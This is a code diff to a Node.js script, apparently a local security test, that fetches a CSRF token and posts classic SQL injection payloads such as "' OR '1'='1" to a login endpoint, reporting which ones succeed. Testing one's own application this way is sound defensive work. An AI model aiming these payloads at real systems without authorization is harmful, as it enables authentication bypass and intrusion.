@@ -1,12 +1,30 @@
-const axios = require('axios');
+const axios = require("axios");
 
 // SQL Injection simulation on login form
-// This script attempts to login with a classic SQL injection payload
+// This script attempts to login with classic SQL injection payloads
 
-const BASE_URL = 'http://localhost:3001/api/auth/login';
+// Configure backend origin: respect BACKEND_ORIGIN env or default to local dev
+const ORIGIN = process.env.BACKEND_ORIGIN || "http://localhost:3001";
+const LOGIN_URL = `${ORIGIN}/api/auth/login`;
+const CSRF_URL = `${ORIGIN}/api/csrf-token`;
+
+async function getCsrfHeaders() {
+  const { data } = await axios.get(CSRF_URL);
+  const token = data.csrfToken;
+  return {
+    headers: {
+      "x-csrf-token": token,
+      Cookie: `XSRF-TOKEN=${token}`,
+      "Content-Type": "application/json",
+    },
+    timeout: 10000,
+    validateStatus: () => true,
+  };
+}
 
 async function sqlInjectionAttack() {
-  console.log('Starting SQL Injection attack simulation...');
+  console.log("Starting SQL Injection attack simulation...");
+  console.log(`Backend: ${ORIGIN}`);
 
   const payloads = [
     "' OR '1'='1",
@@ -17,24 +35,31 @@ async function sqlInjectionAttack() {
     "' OR '1'='1' /*",
   ];
 
+  const baseConfig = await getCsrfHeaders();
+
   for (let i = 0; i < payloads.length; i++) {
     const payload = payloads[i];
-    try {
-      const response = await axios.post(BASE_URL, {
+    const response = await axios.post(
+      LOGIN_URL,
+      {
         email: payload,
-        password: 'anything',
-      });
+        password: "anything",
+      },
+      baseConfig
+    );
+
+    if (response.status >= 200 && response.status < 300) {
       console.log(`Payload ${i + 1}: SUCCESS - Response:`, response.data);
-    } catch (error) {
-      if (error.response) {
-        console.log(`Payload ${i + 1}: FAILED - ${error.response.data.error}`);
-      } else {
-        console.log(`Payload ${i + 1}: ERROR - ${error.message}`);
-      }
+    } else {
+      const msg =
+        response.data && response.data.error
+          ? response.data.error
+          : `HTTP ${response.status}`;
+      console.log(`Payload ${i + 1}: FAILED - ${msg}`);
     }
   }
 
-  console.log('SQL Injection simulation completed.');
+  console.log("SQL Injection simulation completed.");
 }
 
 sqlInjectionAttack().catch(console.error);
